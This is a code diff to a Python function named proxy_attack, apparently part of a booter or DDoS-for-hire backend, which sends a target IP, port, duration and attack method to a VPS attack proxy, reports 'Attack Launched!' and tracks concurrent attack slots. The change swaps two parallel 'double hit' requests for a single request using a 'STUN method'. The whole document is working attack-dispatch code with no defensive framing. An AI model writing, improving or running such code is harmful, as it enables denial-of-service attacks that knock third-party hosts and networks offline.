@@ -220,74 +220,31 @@ def encrypted_reply(data_dict):
 
 def proxy_attack(ip, port, time_sec):
     """
-    Forward attack request to VPS proxy — DOUBLE HIT (2 parallel requests).
+    Forward attack request to VPS proxy — single request, STUN method.
     No TeamC2; only proxy.py.
     """
-    results = {"proxy_1": None, "proxy_2": None}
-
-    def call_proxy(slot):
-        try:
-            r = requests.post(ATTACK_PROXY_URL, json={
-                'secret': PROXY_SECRET,
-                'ip': ip,
-                'port': port,
-                'time': time_sec,
-                'method': PROXY_METHOD
-            }, timeout=15)
-            if r.status_code == 200:
-                data = r.json()
-                if data.get("status") == "queued":
-                    results[slot] = {
-                        "status": "queued",
-                        "message": data.get("message", "⚡ Attack Launched!"),
-                        "launchedCount": data.get("launchedCount", 1),
-                    }
-                else:
-                    results[slot] = {"status": "error", "message": data.get("message", "Attack failed")}
-            else:
-                results[slot] = {"status": "error", "message": f"Proxy returned {r.status_code}"}
-        except Exception as e:
-            results[slot] = {"status": "error", "message": str(e)}
-
-    # Fire 2 parallel proxy requests
-    threads = [
-        threading.Thread(target=call_proxy, args=("proxy_1",)),
-        threading.Thread(target=call_proxy, args=("proxy_2",)),
-    ]
-    for t in threads:
-        t.start()
-    for t in threads:
-        t.join(timeout=20)
-
-    proxy1_ok = results["proxy_1"] and results["proxy_1"].get("status") == "queued"
-    proxy2_ok = results["proxy_2"] and results["proxy_2"].get("status") == "queued"
-
-    if proxy1_ok or proxy2_ok:
-        msgs = []
-        total_launched = 0
-        if proxy1_ok:
-            msgs.append("Proxy#1: " + results["proxy_1"].get("message", "queued"))
-            total_launched += results["proxy_1"].get("launchedCount", 1)
-        if proxy2_ok:
-            msgs.append("Proxy#2: " + results["proxy_2"].get("message", "queued"))
-            total_launched += results["proxy_2"].get("launchedCount", 1)
-        return {
-            "status": "queued",
-            "message": " | ".join(msgs) if msgs else "⚡ Attack Launched!",
-            "target": f"{ip}:{port}",
-            "slots": {"active": total_launched, "available": max(8 - total_launched, 0), "max": 8},
-            "sources": results,
-        }
-
-    # Both failed
-    err_msgs = []
-    if results["proxy_1"]: err_msgs.append("Proxy#1: " + results["proxy_1"].get("message", "failed"))
-    if results["proxy_2"]: err_msgs.append("Proxy#2: " + results["proxy_2"].get("message", "failed"))
-    return {
-        "status": "error",
-        "message": " | ".join(err_msgs) if err_msgs else "Attack failed",
-        "sources": results,
-    }
+    try:
+        r = requests.post(ATTACK_PROXY_URL, json={
+            'secret': PROXY_SECRET,
+            'ip': ip,
+            'port': port,
+            'time': time_sec,
+            'method': PROXY_METHOD
+        }, timeout=15)
+        if r.status_code == 200:
+            data = r.json()
+            if data.get("status") == "queued":
+                launched = data.get("launchedCount", 1)
+                return {
+                    "status": "queued",
+                    "message": data.get("message", "⚡ Attack Launched!"),
+                    "target": f"{ip}:{port}",
+                    "slots": {"active": launched, "available": max(8 - launched, 0), "max": 8},
+                }
+            return {"status": "error", "message": data.get("message", "Attack failed")}
+        return {"status": "error", "message": f"Proxy returned {r.status_code}"}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
 
 def proxy_status():
     """Simple online check"""
